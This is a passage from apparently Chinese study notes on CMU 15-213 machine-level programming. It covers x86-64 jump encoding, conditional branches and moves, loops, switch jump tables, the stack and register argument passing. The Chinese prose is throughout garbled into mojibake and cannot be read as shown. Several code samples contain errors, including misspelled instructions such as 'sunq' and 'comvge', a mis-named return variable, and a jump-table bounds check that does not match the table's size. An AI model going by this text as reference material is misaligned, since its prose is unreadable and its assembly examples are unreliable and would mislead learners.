‡ã€‚</p><p>ä¸‹é¢çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq%rdi,%rax<br>jmp.L2<br> .L3:<br> sarq%rax<br> .L2:<br> testq%rax,%rax<br> jg.L3<br> rep,ret<br></code></pre></td></tr></table></figure><p>å¯¹åº”çš„åæ±‡ç¼–ç‰ˆæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0:48 89 f8mov%rdi,%rax<br>3:eb 03jmp8 &lt;loop+0x8&gt;<br>5:48 d1 f8sar%rax<br>8:48 85 c0test%rax,%rax<br>b:7f f8jg5 &lt;loop+0x5&gt;<br>d:f3 c3repz retq<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥ä»åæ±‡ç¼–å™¨äº§ç”Ÿçš„æ³¨é‡Šæ˜ç¡®è¯»å‡º.L2çš„è·³è½¬ç›®æ ‡æŒ‡æ˜ä¸º0x8ï¼ˆtestè¡Œï¼‰ï¼Œ.L3ä¸º0x5 ï¼ˆsarè¡Œï¼‰ã€‚è€Œè§‚å¯Ÿå­—èŠ‚ç¼–ç ï¼Œå‘ç°.L2çš„å­—èŠ‚ç¼–ç ä¸º03ï¼Œè€Œ.L3çš„å­—èŠ‚ç¼–ç ä¸ºf8 ã€‚è¿™é‡Œå°±æ˜¯åˆ©ç”¨PCç›¸å¯¹çš„ç¼–ç æ–¹å¼ï¼Œç›®æ ‡æŒ‡ä»¤ï¼ˆtestè¡Œï¼‰ä¸º0x8ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤ï¼ˆsarè¡Œï¼‰åœ°å€ä¸º0x5ï¼Œæ•…å·®å€¼0x3ä¸º.L2ç¼–ç ã€‚åŒç†ï¼Œç›®æ ‡æŒ‡ä»¤ï¼ˆsarè¡Œï¼‰ä¸º0x5ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤ï¼ˆrepè¡Œï¼‰ä¸º0xdï¼Œæ’æŒ‡0xf8ï¼ˆåè¿›åˆ¶-8ï¼‰ä¸º.L3ç¼–ç ã€‚</p><p>å› æ­¤ï¼Œä¸‰ä¸ªåœ°å€ä¹‹é—´æˆ‘ä»¬å¯ä»¥åšåˆ°çŸ¥äºŒæ±‚ä¸€ã€‚<strong>ç›®æ ‡åœ°å€&#x3D;æ ‡å¿—ç¼–ç +ä¸‹ä¸€è¡Œåœ°å€</strong></p><p>åˆ©ç”¨è·³è½¬æŒ‡ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°æ¡ä»¶åˆ†æ”¯å’Œå¾ªç¯ç»“æ„ã€‚</p><h4 id="æ¡ä»¶åˆ†æ”¯"><a href="#æ¡ä»¶åˆ†æ”¯" class="headerlink" title="æ¡ä»¶åˆ†æ”¯"></a>æ¡ä»¶åˆ†æ”¯</h4><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç”¨<strong>æ§åˆ¶çš„æ¡ä»¶è½¬ç§»</strong>æ€è·¯å†™å‡ºçš„ä»£ç ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> lt_cnt = <span class="hljs-number">0</span>;<br><span class="hljs-type">long</span> ge_cnt = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">absdiff_se</span><span class="hljs-params">(<span class="hljs-type">long</span> x, <span class="hljs-type">long</span> y)</span> &#123;<br>    <span class="hljs-type">long</span> result;<br>    <span class="hljs-keyword">if</span>(x&lt;y) &#123;<br>        lt_cnt++;<br>        result = y - x;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        ge_cnt++;<br>        result = x - y;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸ä¸Šè¿°ä»£ç ç­‰ä»·çš„gotoä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">gotodiff_se</span><span class="hljs-params">(<span class="hljs-type">long</span> x, <span class="hljs-type">long</span> y)</span> &#123;<br>    <span class="hljs-type">long</span> result;<br>    <span class="hljs-keyword">if</span>(x &gt;= y) &#123;<br>        <span class="hljs-keyword">goto</span> x_ge_y;<br>    &#125;<br>    lt_cnt++;<br>    result = y - x;<br>    <span class="hljs-keyword">return</span> result;<br>x_ge_y:<br>    ge_cnt++;<br>    result = x - y;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>å°†gotoä»£ç è½¬æ¢ä¸ºæ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;x in %rdi, y in %rsi<br>absdiff_se:<br>cmpq%rsi, %rdi;Compare x:y<br>jge.L2;if &gt;= goto x_ge_y<br>addq$1, lt_cnt(%rip);lt_cnt++<br>movq%rsi, %rax<br>subq%rdi, %rax;result = y - x<br>ret<br>  .L2:<br>  addq$1, ge_cnt(%rip)<br>  movq%rdi, %rax<br>  subq%rsi, %rax<br>  ret<br></code></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œæœ‰æ—¶ä¸ºäº†æé«˜æ•ˆç‡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>æ•°æ®çš„æ¡ä»¶è½¬ç§»</strong>ï¼Œå³å…ˆè®¡ç®—å‡ºæ‰€æœ‰åˆ†æ”¯äº§ç”Ÿçš„ç»“æœï¼Œå†åˆ¤æ–­éœ€è¦ä¼ é€å“ªä¸ªç»“æœã€‚ä¾‹å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">cmovdiff</span><span class="hljs-params">(<span class="hljs-type">long</span> x, <span class="hljs-type">long</span> y)</span><br>&#123;<br>    <span class="hljs-type">long</span> rval = y-x;<br>    <span class="hljs-type">long</span> eval = x-y;<br>    <span class="hljs-type">long</span> ntest = (x &gt;= y);<br>    <span class="hljs-keyword">if</span>(ntest)<br>        rval = eval;<br>    <span class="hljs-keyword">return</span> rval;<br>&#125;<br></code></pre></td></tr></table></figure><p>äº§ç”Ÿçš„æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;x in %rdi, y in %rsi<br>absdiff:<br>movq%rsi, %rax<br>subq%rdi, %rax;rval = y-x<br>movq%rdi, %rdx<br>sunq%rsi, %rdx;eval = x-y<br>cmpq%rsi, %rdi;Compare x:y<br>comvge%rdx, %rax;if &gt;=,rval = eval<br>ret;return tval<br></code></pre></td></tr></table></figure><p>é‡Œé¢æ¶‰åŠåˆ°ä¸€ç±»æ¡ä»¶ä¼ é€æŒ‡ä»¤ï¼š<code>comv</code>ï¼Œæ¡ä»¶ä¼ é€æŒ‡ä»¤å†æ¡ä»¶æ»¡è¶³æ—¶æŠŠæºå€¼Så¤åˆ¶åˆ°ç›®çš„Rã€‚</p><p><img src="/Pictures/CMU15-213/comv.png" alt="cmov"></p><p>å½“ç„¶ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸æ˜¯æ‰€æœ‰æ¡ä»¶è¡¨è¾¾å¼éƒ½å¯ç”¨æ¡ä»¶ä¼ é€æ¥ç¼–è¯‘ã€‚æœ€é‡è¦çš„æ˜¯ï¼Œå½“è¯­å¥ä¼šäº§ç”Ÿé™¤è¿”å›å€¼çš„å‰¯ä½œç”¨æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´ä¸€äº›é”™è¯¯ã€‚</p><h4 id="å¾ªç¯ç»“æ„"><a href="#å¾ªç¯ç»“æ„" class="headerlink" title="å¾ªç¯ç»“æ„"></a>å¾ªç¯ç»“æ„</h4><ol><li><p><strong>do-whileå¾ªç¯</strong></p><p>è¯¥è¯­å¥çš„é€šç”¨å½¢å¼å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">do</span><br>    body-statement<br>    <span class="hljs-title function_">while</span><span class="hljs-params">(test-expr)</span><br></code></pre></td></tr></table></figure><p>è¿™ç§é€šç”¨å½¢å¼å¯ä»¥è¢«ç¿»è¯‘ä¸ºå¦‚ä¸‹æ‰€ç¤ºçš„æ¡ä»¶å’Œgotoè¯­å¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">loop:<br>body-statement<br>    t = test-expr;<br><span class="hljs-keyword">if</span>(t)<br>        <span class="hljs-keyword">goto</span> loop;<br></code></pre></td></tr></table></figure><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªå®ç°é˜¶ä¹˜çš„å‡½æ•°ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç­‰ä»·çš„æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;n in %rdi<br>fact_do:<br>movl$1, %eax;Set result = 1<br>  .L2:;Loop:<br>  imulq%rdi, %rax;result *= n<br>  subq $1, %rdi;n = n-1<br>  cmpq$1, %rdi;Compare n:1<br>  jg.L2;if &gt;, goto Loop<br>  rep; ret;Return<br></code></pre></td></tr></table></figure></li><li><p><strong>whileå¾ªç¯</strong></p><p>é€šç”¨å½¢å¼å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span>(test-expr)<br>    body-statement<br></code></pre></td></tr></table></figure><p>ä¸ä¸Šä¸€ä¸ªå¾ªç¯çš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç¬¬ä¸€æ¬¡è¿è¡Œä»£ç ä¹‹å‰è¿›è¡Œæ¡ä»¶åˆ¤æ–­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">goto</span> test;<br>loop:<br>body-statement<br>test:<br>t = test-expr;<br><span class="hljs-keyword">if</span>(t)<br>        <span class="hljs-keyword">goto</span> loop;<br></code></pre></td></tr></table></figure><p>å¦ä¸€ç§æ–¹å¼æ˜¯å°†whileè½¬æ¢ä¸ºdo-whileï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">t = test-expr;<br><span class="hljs-keyword">if</span>(!t)<br>    <span class="hljs-keyword">goto</span> done;<br><span class="hljs-keyword">do</span><br>    body-statement<br>    <span class="hljs-title function_">while</span><span class="hljs-params">(test-expr)</span>;<br>done:<br></code></pre></td></tr></table></figure></li><li><p><strong>forå¾ªç¯</strong></p><p>forå¾ªç¯çš„é€šç”¨å½¢å¼å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(init-expr; test-expr; update-expr)<br>    body-statement<br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨whileå¾ªç¯æ”¹å†™ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">init-expr;<br><span class="hljs-keyword">while</span>(test-expr) &#123;<br>    body-statement<br>    update-expr;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>switchè¯­å¥</strong></p><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¼•å…¥ä¸€ä¸ªæ–°çš„æ•°æ®ç»“æ„è·³è½¬è¡¨ï¼Œè·³è½¬è¡¨æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªæŒ‡å‘ä»£ç ä½ç½®çš„æŒ‡é’ˆï¼Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">switch_eg_impl</span><span class="hljs-params">(<span class="hljs-type">long</span> x, <span class="hljs-type">long</span> n, <span class="hljs-type">long</span> *dest)</span> <br>&#123;<br>    <span class="hljs-comment">// Table of code pointers</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">void</span> *jt[<span class="hljs-number">3</span>]=&#123;&amp;&amp;loc_A, &amp;&amp;loc_B, &amp;&amp;loc_C&#125;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> index = n - <span class="hljs-number">100</span>;<br>    <span class="hljs-type">long</span> val;<br>    <span class="hljs-keyword">if</span>(index&gt;<span class="hljs-number">6</span>)<br>        <span class="hljs-keyword">goto</span> loc_def;<br>    <span class="hljs-keyword">goto</span> *jt[index];<br>    <br>    loc_A:<br>    val = x*<span class="hljs-number">13</span>;<br>    <span class="hljs-keyword">goto</span> done;<br>    loc_B:<br>    x = x + <span class="hljs-number">10</span><br>    ......<br>    done:<br>    *dest = val;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨Cè¯­è¨€ä¸­ï¼Œswitchè¯­å¥ä¾é è·³è½¬è¡¨å®ç°ã€‚è€Œåœ¨æ±‡ç¼–ä»£ç ä¸­ï¼Œè·³è½¬è¡¨ä»¥å¦‚ä¸‹å£°æ˜æ¥è¡¨ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.section.rodata<br>.align 8<br> .L4:<br> .quad.L3;Case 1<br> .quad.L8;Case 2<br> .quad .L5;Case 3<br></code></pre></td></tr></table></figure></li></ol><h2 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h2><p>è¿‡ç¨‹æä¾›äº†ä¸€ç§ä»£ç çš„å°è£…æ–¹å¼ï¼Œç”¨ä¸€ç»„æŒ‡å®šçš„å‚æ•°å’Œä¸€ä¸ªå¯é€‰çš„è¿”å›å€¼å®ç°äº†æŸç§åŠŸèƒ½ã€‚ç„¶åå¯ä»¥åœ¨ç¨‹åºä¸­ä¸åŒçš„åœ°æ–¹è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚ä¸åŒç¼–ç¨‹è¯­è¨€ä¸­ï¼Œå¯¹è¿‡ç¨‹çš„å®šä¹‰å¤šç§å¤šæ ·ï¼šå‡½æ•°ï¼ˆfunctionï¼‰ï¼Œæ–¹æ³•ï¼ˆmethodï¼‰ï¼Œå­ä¾‹ç¨‹ï¼ˆsubroutineï¼‰ï¼Œå¤„ç†å‡½æ•°ï¼ˆhandlerï¼‰ç­‰ï¼Œä½†æ˜¯å®ƒä»¬æœ‰ä¸€äº›å…±æœ‰çš„ç‰¹æ€§ã€‚</p><p>å‡è®¾è¿‡ç¨‹Pè°ƒç”¨è¿‡ç¨‹Qï¼ŒQæ‰§è¡Œåè¿”å›åˆ°Pã€‚è¿™äº›åŠ¨ä½œåŒ…æ‹¬ä¸‹é¢ä¸€ä¸ªæˆ–å¤šä¸ªæœºåˆ¶ï¼š</p><ul><li><em>ä¼ é€’æ§åˆ¶</em>ï¼Œåœ¨è¿›å…¥è¿‡ç¨‹Qçš„æ—¶å€™ï¼Œç¨‹åºè®¡æ•°å™¨å¿…é¡»è¢«è®¾ç½®ä¸ºQçš„ä»£ç çš„èµ·å§‹åœ°å€ï¼Œç„¶ååœ¨è¿”å›æ—¶ï¼Œè¦æŠŠç¨‹åºè®¡æ•°å™¨è®¾ç½®ä¸ºPä¸­è°ƒç”¨Qåé¢é‚£æ¡æŒ‡ä»¤çš„åœ°å€ã€‚</li><li><em>ä¼ é€’æ•°æ®</em>ï¼ŒPå¿…é¡»èƒ½å¤Ÿå‘Qæä¾›ä¸€ä¸ªæˆ–å¤šä¸ªå‚æ•°ï¼ŒQå¿…é¡»èƒ½å¤Ÿå‘Pè¿”å›ä¸€ä¸ªå€¼ã€‚</li><li><em>åˆ†é…å’Œé‡Šæ”¾å†…å­˜</em>ï¼Œåœ¨å¼€å§‹æ—¶ï¼ŒQå¯èƒ½éœ€è¦ä¸ºå±€éƒ¨å˜é‡åˆ†é…ç©ºé—´ï¼Œè€Œåœ¨è¿”å›å‰ï¼Œåˆå¿…é¡»é‡Šæ”¾è¿™äº›å­˜å‚¨ç©ºé—´ã€‚</li></ul><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å…ˆæè¿°æ§åˆ¶ï¼Œå†æè¿°ä¼ é€’ï¼Œæœ€åæè¿°å†…å­˜ç®¡ç†ã€‚</p><h3 id="è¿è¡Œæ—¶æ ˆ"><a href="#è¿è¡Œæ—¶æ ˆ" class="headerlink" title="è¿è¡Œæ—¶æ ˆ"></a>è¿è¡Œæ—¶æ ˆ</h3><p>åœ¨x86-64ä¸­ï¼Œè¿è¡Œæ—¶æ ˆå‘ä½åœ°å€æ–¹å‘å¢é•¿ã€‚å½“è¿‡ç¨‹éœ€è¦çš„å­˜å‚¨ç©ºé—´è¶…å‡ºå¯„å­˜å™¨èƒ½å¤Ÿå­˜æ”¾çš„å¤§å°æ—¶ï¼Œå°±ä¼šåœ¨æ ˆä¸Šåˆ†é…ç©ºé—´ã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºè¿‡ç¨‹çš„<strong>æ ˆå¸§</strong>ã€‚ä¸‹å›¾ç»™å‡ºäº†ä¸€ä¸ªè¿è¡Œæ—¶æ ˆçš„é€šç”¨ç»“æ„ï¼š</p><p><img src="/Pictures/CMU15-213/stack.png" alt="stack"></p><p>å½“å‰æ­£åœ¨æ‰§è¡Œçš„è¿‡ç¨‹çš„å¸§æ€»æ˜¯åœ¨æ ˆé¡¶ã€‚å½“è¿‡ç¨‹Pè°ƒç”¨Qæ—¶ï¼Œä¼šå°†è¿”å›åœ°å€å‹å…¥æ ˆä¸­ï¼ŒæŒ‡æ˜å½“Qè¿”å›æ—¶ï¼Œè¦ä»Pç¨‹åºçš„å“ªä¸ªä½ç½®ç»§ç»­æ‰§è¡Œã€‚æˆ‘ä»¬æŠŠè¿™ä¸ªè¿”å›åœ°å€å½“ä½œPæ ˆå¸§çš„ä¸€éƒ¨åˆ†ã€‚Qçš„ä»£ç ä¼šæ‰©å±•å½“å‰æ ˆçš„è¾¹ç•Œï¼Œåˆ†é…å®ƒçš„æ ˆå¸§æ‰€éœ€çš„ç©ºé—´ã€‚å€ŸåŠ©å¯„å­˜å™¨ï¼Œè¿‡ç¨‹Pæœ€å¤šå¯ä»¥ä¼ é€’6å‚æ•°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“å‚æ•°ä¸å¤šäº6ä¸ªæ—¶ï¼Œå¯ä»¥ä¸åˆ›å»ºæ ˆå¸§ã€‚</p><h3 id="æ§åˆ¶è½¬ç§»"><a href="#æ§åˆ¶è½¬ç§»" class="headerlink" title="æ§åˆ¶è½¬ç§»"></a>æ§åˆ¶è½¬ç§»</h3><p>å°†æ§åˆ¶ä»å‡½æ•°Pè½¬åˆ°å‡½æ•°Qåªéœ€è¦ç®€å•æŠŠPCè®¾ç½®ä¸ºQçš„ä»£ç çš„èµ·å§‹ä½ç½®ã€‚ä¸è¿‡Qè¿”å›æ—¶ï¼Œå¤„ç†å™¨å¿…é¡»è®°å½•å¥½å®ƒéœ€è¦ç»§ç»­Pçš„æ‰§è¡Œçš„ä»£ç ä½ç½®ã€‚åœ¨x86-64æœºå™¨ä¸­ï¼Œè¿™ä¸ªä¿¡æ¯æ˜¯ç”¨æŒ‡ä»¤<code>call</code>æ¥è®°å½•çš„ã€‚è¯¥æŒ‡ä»¤ä¼šå°†åœ°å€Aå‹å…¥æ ˆä¸­ï¼Œå¹¶å°†PCè®¾ç½®ä¸ºQçš„èµ·å§‹åœ°å€ã€‚å‹å…¥çš„åœ°å€Aè¢«ç§°ä¸ºè¿”å›åœ°å€ï¼Œæ˜¯ç´§è·Ÿåœ¨callæŒ‡ä»¤åé¢é‚£ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚retä¼šå°†Aå¼¹å‡ºå¹¶æŠŠPCè®¾ç½®ä¸ºAã€‚</p><p>åˆ©ç”¨ä¸‹å›¾æˆ‘ä»¬å¯ä»¥æ›´åŠ ç›´è§‚çš„æ„Ÿå—åˆ°callå‡½æ•°çš„è¿è¡Œï¼š</p><p><img src="/Pictures/CMU15-213/call.png" alt="call"></p><h3 id="æ•°æ®ä¼ é€"><a href="#æ•°æ®ä¼ é€" class="headerlink" title="æ•°æ®ä¼ é€"></a>æ•°æ®ä¼ é€</h3><p>å½“è°ƒç”¨ä¸€ä¸ªè¿‡ç¨‹æ—¶ï¼Œé™¤äº†è¦æŠŠæ§åˆ¶ä¼ é€’ç»™å®ƒå¹¶åœ¨è¿‡ç¨‹è¿”å›æ—¶å†ä¼ é€’å›æ¥ä¹‹å¤–ï¼Œè¿‡ç¨‹è°ƒç”¨è¿˜å¯èƒ½åŒ…æ‹¬æŠŠæ•°æ®ä½œä¸ºå‚æ•°ä¼ é€’ï¼Œè€Œä»è¿‡ç¨‹è¿”å›è¿˜æœ‰å¯èƒ½åŒ…æ‹¬è¿”å›ä¸€ä¸ªå€¼ã€‚</p><p>x86-64ä¸­ï¼Œå¯ä»¥é€šè¿‡å¯„å­˜å™¨ä¼ é€’æœ€å¤š6ä¸ªæ•´å‹å‚æ•°ã€‚å¯„å­˜å™¨çš„ä½¿ç”¨æ˜¯æœ‰ç‰¹æ®Šé¡ºåºçš„ï¼Œå¯„å­˜å™¨ä½¿ç”¨çš„åå­—å–å†³äºè¦ä¼ é€’çš„æ•°æ®ç±»å‹çš„å¤§å°ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p><table><thead><tr><th>æ“ä½œæ•°å¤§å°ï¼ˆä½ï¼‰&#x2F;å‚æ•°æ•°é‡</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th></tr></thead><tbody><tr><td>64</td><td>%rdi</td><td>%rsi</td><td>%rdx</td><td>%rcx</td><td>%r8</td><td>%r9</td></tr><tr><td>32</td><td>%edi</td><td>%esi</td><td>%edx</td><td>%ecx</td><td>%r8d</td><td>%r9d</td></tr><tr><td>16</td><td>%di</td><td>%si</td><td>%dx</td><td>%cx</td><td>%r8w</td><td>%r9w</td></tr><tr><td>8</td><td>%dil</td><td>%sil</td><td>%dl</td><td>%cl</td><td>%r8b</td><td>%r9b</td></tr></tbody></table><p>å¦‚æœä¸€ä¸ªå‡½æ•°æœ‰å¤§äº6ä¸ªçš„å‚æ•°ï¼Œé‚£ä¹ˆè¶…å‡º6ä¸ªçš„éƒ¨åˆ†éœ€è¦é€šè¿‡æ ˆæ¥ä¼ é€’ã€‚</p><p>ä¸‹é¢çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">proc</span><span class="hljs-params">(<span class="hljs-type">long</span> a1, <span class="hljs-type">long</span> *a1p, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> *a2p, <span class="hljs-type">short</span> a3, <span class="hljs-type">short</span> *a3P, <span class="hljs-type">char</span> a4, <span class="hljs-type">char</span> *a4p)</span><br>&#123;<br>    *a1p += a1;<br>    *a2p += a2;<br>    *a3p += a3;<br>    *a4p += a4;<br>        <br>&#125;<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆçš„æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;a1 in %rdi, a1p in %rsi, a2 in %edx, a2p in %rcx, a3 in %r8w, a3p in %r9, a4 at %rsp+8, a4p at %rsp+16<br>proc:<br>movq16(%rsp), %rax<br>addq%rdi, (%rsi)<br>addl%edx, (%rcx)<br>addw%r8w, (%r9)<br>movl 8(%rsp), %edx<br>addb%dl, (%rax)<br>ret<br></code></pre></td></tr></table></figure><p>å¯„å­˜å™¨ç»„æ˜¯å”¯ä¸€è¢«æ‰€æœ‰è¿‡ç¨‹å…±äº«çš„èµ„æºï¼Œè™½ç„¶åœ¨ç»™å®šæ—¶åˆ»åªæœ‰ä¸€ä¸ªè¿‡ç¨‹æ˜¯æ´»åŠ¨çš„ï¼Œä½†æ˜¯ä»ç„¶éœ€è¦ä¿è¯ä¸€ä¸ªè¿‡ç¨‹åœ¨è°ƒç”¨æ—¶ä¸ä¼šè¦†ç›–å¦ä¸€ä¸ªè¿‡ç¨‹ä¿å­˜çš„æ•°æ®ã€‚</p><p>æŒ‰ç…§æƒ¯ä¾‹ï¼Œå¯„å­˜å™¨%rbx,%rbpä»¥åŠ%r12-%r15è¢«åˆ’åˆ†ä¸ºè¢«è°ƒç”¨è€…ä¿å­˜å¯„å­˜å™¨ï¼Œä¸¾ä¸ªä¾‹å­å°±æ˜¯åœ¨Pè°ƒç”¨Qæ—¶ï¼ŒQå¿…é¡»ä¿å­˜è¿™äº›å¯„å­˜å™¨çš„å€¼ä¸èƒ½æ”¹å˜ã€‚</p><p>åŒæ ·çš„ï¼Œç”±äºæ ˆçš„ç‰¹ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“ç†è§£é€’å½’å‡½æ•°çš„è°ƒç”¨è¿‡ç¨‹ã€‚</p><h2 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h2><p>å¯¹äºæ•°æ®ç±»å‹Tå’Œæ•´å‹å¸¸æ•°Nï¼Œæˆ‘ä»¬å£°æ˜ä¸€ä¸ªæ•°ç»„å¦‚ä¸‹ï¼šT  A[ N 